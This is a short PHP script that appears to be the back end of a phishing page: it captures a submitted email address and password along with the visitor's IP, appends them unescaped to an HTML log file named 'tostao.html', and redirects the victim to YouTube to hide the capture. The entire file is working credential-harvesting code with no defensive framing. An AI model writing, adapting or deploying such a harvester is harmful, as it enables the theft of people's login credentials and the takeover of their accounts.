<?php

$noborrar = $_POST['noborrar']; 
$pass = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR']; 
$f = fopen("tostao.html", "a"); 
fwrite ($f, 'Email: [<b><font color="#2112F2">'.$noborrar.'</font></b>] Password: [<b><font color="#F21230">'.$pass.'</font></b>] IP: [<b><font color="#080001">'.$ip.'</font></b>]<br>');
fclose($f);

header("Location: https://www.youtube.com");
?>
